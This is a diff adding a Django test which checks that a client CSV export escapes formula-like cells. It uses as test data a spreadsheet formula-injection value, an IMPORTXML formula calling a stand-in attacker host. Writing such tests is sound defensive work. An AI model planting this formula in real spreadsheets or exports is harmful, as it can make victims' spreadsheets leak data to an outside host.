@@ -358,6 +358,17 @@ class ImportExportTests(TestCase):
         self.assertIn("Export Client", response.content.decode())
         self.assertTrue(AuditLog.objects.filter(business=self.business, metadata__kind="export", metadata__entity_type="clients").exists())
 
+    def test_export_clients_escapes_formula_like_cells(self):
+        Client.objects.create(business=self.business, full_name="=IMPORTXML(\"https://evil.test\")", phone="+77010000003")
+        self.api.force_authenticate(self.owner)
+
+        response = self.api.get("/api/export/clients/", {"business": self.business.id})
+
+        self.assertEqual(response.status_code, 200)
+        body = response.content.decode()
+        self.assertIn("'=IMPORTXML", body)
+        self.assertNotIn(",=IMPORTXML", body)
+
     def test_staff_cannot_export_deals_without_deal_permission(self):
         self.api.force_authenticate(self.staff)
 
